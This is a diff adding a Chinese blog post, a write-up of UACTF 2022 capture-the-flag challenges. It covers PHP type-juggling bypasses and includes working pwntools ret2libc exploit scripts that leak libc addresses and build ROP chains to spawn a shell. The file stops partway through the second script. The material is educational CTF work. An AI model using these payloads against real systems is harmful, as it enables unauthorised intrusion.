@@ -1,0 +1,1807 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="keywords" content="UACTF 2022比赛的WriteUp, 老叭美食家">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>UACTF 2022比赛的WriteUp | 老叭美食家</title>
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="老叭美食家" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/static/image/header/home.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">老叭美食家</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>主页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>联系</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">老叭美食家</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			主页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			联系
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151055.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">UACTF 2022比赛的WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tag/%E6%AF%94%E8%B5%9B/">
+                                <span class="chip bg-color">比赛</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/category/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-08-15
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-04-30
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    20 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>简介：</p>
+<p>本文为UACTF 2022比赛的WriteUp。本次还是与NING0121、meishijia一起组队参赛，最终在447支参赛队伍中排名21位。打怪升级中，再接再厉～</p>
+<span id="more"></span>
+
+<p>说明：本WriteUp中标志[Aha!]是赛后总结并参考其他师傅的WriteUp完成的，毕竟没有做出来的题更要记录学习。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="1-1-Trial-by-PHP"><a href="#1-1-Trial-by-PHP" class="headerlink" title="1-1 Trial by PHP"></a><strong>1-1 Trial by PHP</strong></h3><p>基础的 PHP 绕过技术。（题目中间有段时间提供了 php 脚本源码）</p>
+<p>题目要求我们达到它所需要我们实现的三个目标，开始并没有思路，没有什么交互按钮，因此就尝试查看 robots.txt，发现存在 secret-source.php 文件。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/SYFwFZuYoVBUlNe4eJ8wdQ.png" alt="1"></p>
+<p>接着进行访问，阅读逻辑后发现需要实现三个 success 才能够显示出 flag，于是首先尝试直接修改 html 的标签（果然异想天开），接着就需要首先三个条件。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-3.png" alt="2"></p>
+<ol>
+<li>超短 hash<br> 要求 ：md5_hash 后 == 0。<br> 思考：首先了解 == 的含义，hash_hmac 绕过方式。<br> 解决：由于 “==” 只判断值相同，因此我们只需要让 hash_hmac 返回 NULL即可，经查询发现 php 无法处理数组数据，因此只需要让 egg 为数组即可；</li>
+<li>长度大于 hash<br> 要求：字符串加密长度 &lt; 字符串长度。<br> 思考：abs 的接收参数？<br> 解决：由于abs为绝对值函数，当输入字符串数据会返回0，进而生成的的 hash 为 “MA==”，长度为4，因此我们只需要赋值一个长于4字符的字符串即可。</li>
+<li>获得参数但是避免特殊符号<br> 要求：既要获得“THROUGH_A_TRAP_LADEN_MAZE”参数，同时不能包含“_”。<br> 思考：开始想着通过二次URL编码绕过，后来发现不行。<br> 解决：’ . ‘ 在经过 $_GET 后会变成  ‘ _ ‘。</li>
+</ol>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-4.png" alt="3"></p>
+<pre class="line-numbers language-none"><code class="language-none">UACTF&#123;17’5_13v1054_n07_13v105444&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="1-2-Juggler"><a href="#1-2-Juggler" class="headerlink" title="1-2 Juggler"></a><strong>1-2 Juggler</strong></h3><p>基础的 PHP 绕过技术。题目提供了验证的源码。</p>
+<p>很明显我们需要绕过以下两部分内容，关键在于不知道 $secret 和 $password 两个参数。针对 $secret 我们很明显能通过 hash 后进行二次赋值，因此我们需要对 nonce 参数进行处理，因为 php 无法处理数组参数，因此我们构造 nonce 参数即可使函数返回 0，接着由于已知 username 为 admin，于此同时我们便获得了固定的 hmac 参数；第二要解决的就是 strcmp 问题，虽然不知道 $password 但是同样使用数组类型数据，便可以满足条件；</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-1.png" alt="4"></p>
+<p>使用 burpsuite 拦截并修改数据如下即可。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-2.png" alt="5"></p>
+<p>页面打印出了 flag。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/RhUs09PxOqfzokWQDGm_zg.png" alt="6"></p>
+<pre class="line-numbers language-none"><code class="language-none">UACTF&#123;jugg1e_this_y0u_fi1thy_casua1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="1-3-Unhackable-Code-Runner-Aha"><a href="#1-3-Unhackable-Code-Runner-Aha" class="headerlink" title="1-3 Unhackable Code Runner [Aha!]"></a><strong>1-3 Unhackable Code Runner [Aha!]</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/milan338/CTF-Writeups/tree/main/UACTF_2022">https://github.com/milan338/CTF-Writeups/tree/main/UACTF_2022</a></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h2><h3 id="2-1-something-something-win"><a href="#2-1-something-something-win" class="headerlink" title="2-1 something-something-win"></a><strong>2-1 something-something-win</strong></h3><p>基础的栈溢出题目。</p>
+<p>查看汇编代码，mian函数中会调用sussy函数，sussy函数中存在通过read读入的栈溢出漏洞，代码中存在敏感的win函数，其功能是打开flag文件。</p>
+<p>由于Sussy函数中会对栈的内容进行判断并以此为条件进行跳转，否则会直接exit。所以我们需要将栈以要求的方式填充，再最后将win函数的地址覆盖到栈中的ret位置。最终成功拿到Flag。</p>
+<pre class="line-numbers language-none"><code class="language-none">UACTF&#123;R3T_70_D33Z&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="2-2-Warmup"><a href="#2-2-Warmup" class="headerlink" title="2-2 Warmup"></a><strong>2-2 Warmup</strong></h3><p>这是一道典型的ret2libc题目，题目给出了warmup可执行文件以及编译所用的libc。通过checksec可以看到其仅开启了NX保护措施。</p>
+<p>通过反编译软件Ghidra的分析，我们可以看到程序逻辑：首先判断check1()函数的返回值是否为0，若不为0则进入do_stuff函数。其中check1函数和do_stuff函数如下所示。do_stuff函数中打印了puts函数在内存中的地址，并且存在read函数的栈溢出漏洞。所以我们的利用步骤是首先使得check1函数的返回值不为0，再根据打印的puts函数地址以及给出的glibc获取system以及”/bin/sh”字符串在内存中的地址，最后构造ROP链ret2libc获取shell。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/LuaUPWbAGEdOkaVaQg2Ymg.png" alt="7"></p>
+<p>仅通过反汇编的代码我们试图使check1的返回值为0似乎是不可能的，所以我们还需要研究汇编代码。按照函数调用惯例，64位机器编译的程序的返回值优先被置于RAX寄存器中。同时，通过main函数中调用check1函数返回下一条语句，我们也可以看到其对EAX(RAX的低4字节)进行判断是否为0。所以我们需要关注Check1函数中RAX最后值的变化。该函数中，我们通过scanf(‘%lu’, &amp;input)获取一个unsigned long型，接着通过XMM0以及XMM1寄存器的一系列指令对RAX的值进行修改。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/w6zMVJ9M6MTfqBH0RVoIig.png" alt="8"></p>
+<p>具体的指令说明如下所示。一个unsigned long型使用8字节表示，最大值为2^64-1，所以我们只需要使得scanf的输入超过此值为NULL即可。</p>
+<pre class="line-numbers language-none"><code class="language-none"># 将RBP+8字节(double类型)地址的大小为64bit(8字节)的值赋给XMMO寄存器；
+MOVSD XMM0, qword ptr[RBP+input]
+# 判断两寄存器的值是否存在NULL，并对ZF，IF，CF寄存器赋值；
+# 参考https:&#x2F;&#x2F;www.felixcloutier.com&#x2F;x86&#x2F;ucomisd
+UCOMISD XMM0，XMM1
+# 如果PF寄存器为1，则对AL赋值为1；
+SETP AL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>进入do_stuff函数之后，我们只需要获取在glibc中被动态加载的system以及/bin/sh字符串的地址即可。对于给定的glibc库文件，其内部函数的偏移是固定的，但是其基地址需要被leak出来。真正程序执行时，glibc库函数在内存中的地址为库基地址+库内固定偏移。对于前者的计算，我们通过程序实际运行时某执行过的glibc库函数的实际地址(%p, put或printf泄漏)-其库内固定偏移获得。对于后者，在给定libc的情况，对于函数，我们可以通过<code>readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;system@@GLIBC_2.2.5&quot;</code>指令或者pwntools中ELF(‘./libc-2.31.so’).symbols[‘system’]来获取；对于字符串，我们通过<code>ROPgadget --binary mypwn --string &#39;/bin/sh&#39;</code>或者pwntools中调用<code>next(sh.search(&quot;/bin/sh&quot;))</code>来获取。</p>
+<p>此外，在gdb运行时，我们可以通过命令<code>info proc map</code>来获取内存映射，然后通过`</p>
+<p>info address system<code>和</code>find 0x80048000, 0xc0000000, “/bin/sh”`来查找函数和字符串来验证我们构造的地址是否正确。以上指令非常常用，所以在此记录一下。</p>
+<p>然而，在获得system以及”/bin/sh”后构造ROP链，成功在本地kali上获得shell，但是远程总是无法打通。后来查阅到，在部分x86_64机器上，system函数调用会遇到movasp issue。原因是glibc中的库函数会使用到movaps指令，该指令用于数据传输但要求栈结构必须是16字节对齐的(这也是64位机器的函数调用惯例)。但是我们的ROP链的构造是以8字节为单位，所以可能会遇到该问题报错。解决方案是在ROP链中添加额外的ret指令使得栈16字节对齐或者跳过system函数开头的push指令即可。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/gxBQBJeZKthbMtE3oWIpRg.png" alt="9"></p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2-2-1.png" alt="10"></p>
+<p>完整的Exp如下所示。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span><span class="token number">30005</span><span class="token punctuation">)</span>
+
+<span class="token comment"># try to entry the while loop</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter the pincode: "</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'123456789012345678901234567890'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># receive the leaked address of puts function</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Uhm, not sure what is happening tbh.."</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\nI'm just going to help you out the tinyest bit.. "</span><span class="token punctuation">)</span>
+
+libc_puts_addr_d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"received the puts addr: %s"</span><span class="token punctuation">,</span> libc_puts_addr_d<span class="token punctuation">)</span>
+
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>
+<span class="token comment"># libc = ELF('/lib/x86_64-linux-gnu/libc-2.33.so')</span>
+libc_puts_addr_s <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+libc_base_addr <span class="token operator">=</span> libc_puts_addr_d <span class="token operator">-</span> libc_puts_addr_s
+system_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+binsh_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x401255</span>
+ret_addr <span class="token operator">=</span> <span class="token number">0x40101a</span> <span class="token comment"># to solve the movaps issue</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-3-No-no-no-square"><a href="#2-3-No-no-no-square" class="headerlink" title="2-3 No no no square"></a><strong>2-3 No no no square</strong></h3><p>No no no square程序和warmup一致，均为ret2libc。但是Nonosquare中并没有打印出puts函数的地址，所以需要我们利用栈溢出来得到。</p>
+<p>由于程序执行时调用了puts函数，所以利用思路就是：第一次栈溢出调用puts函数泄漏出GOT表中puts函数的全局偏移并最后跳转到main函数的开头；第二次栈溢出利用计算好的system函数以及/bin/sh字符串的地址完成ret2libc。</p>
+<p>具体的来讲，动态链接的程序是如何装载到内存空间并运行的之后会详细地出一篇博客来详细地介绍。具体的Exp如下所示。</p>
+<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+sh &#x3D; remote(&quot;xx.xx.xx.xx&quot;,30003)
+
+
+# try to entry the while loop
+sh.recvuntil(b&quot;This is going to be fun... is it?&quot;)
+
+
+nonosquare &#x3D; ELF(&#39;.&#x2F;nonosquare&#39;)
+puts_plt &#x3D; nonosquare.plt[&#39;puts&#39;] # 0x405000
+puts_got &#x3D; nonosquare.got[&#39;puts&#39;]
+main &#x3D; nonosquare.symbols[&#39;main&#39;]
+
+
+pop_rdi_addr &#x3D; 0x401343 # pop rdi; ret;
+
+
+payload &#x3D; b&#39;A&#39;*56 + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main)
+print(&quot;[*]Sending the first payload and leak the puts addr %s&quot; % payload)
+sh.sendline(payload)
+
+
+sh.recvuntil(b&quot;no no no&quot;)
+sh.recvuntil(b&quot;Did you have fun?&quot;)
+sh.recvuntil(b&quot;\n&quot;)
+libc_puts_addr_d &#x3D; u64(sh.recv()[:6].ljust(8,b&#39;\x00&#39;)) # 不足8字节补充
+print(libc_puts_addr_d)
+print(&quot;[*]Received the puts addr in libc: %d&quot; % libc_puts_addr_d)
+
+
+# sh.recvuntil(b&quot;This is going to be fun... is it?&quot;)
+# sh.recvuntil(b&quot;no no no&quot;)
+# sh.recvuntil(b&quot;Did you have fun?&quot;)
+
+
+libc &#x3D; ELF(&#39;.&#x2F;libc-2.31.so&#39;)
+libc_start_main_addr_s &#x3D; libc.symbols[&#39;puts&#39;]
+libc_base_addr &#x3D; libc_puts_addr_d - libc_start_main_addr_s
+system_addr &#x3D; libc_base_addr + libc.symbols[&#39;system&#39;]
+binsh_addr &#x3D; libc_base_addr + next(libc.search(b&quot;&#x2F;bin&#x2F;sh&quot;))
+
+
+ret_addr &#x3D; 0x40101a # to solve the movaps issue
+
+
+payload &#x3D; b&#39;A&#39;*56 + p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)
+print(&quot;[*]Sending the second payload: %s&quot; % payload)
+sh.sendline(payload)
+sh.recvuntil(b&quot;no no no&quot;)
+sh.recvuntil(b&quot;Did you have fun?&quot;)
+
+
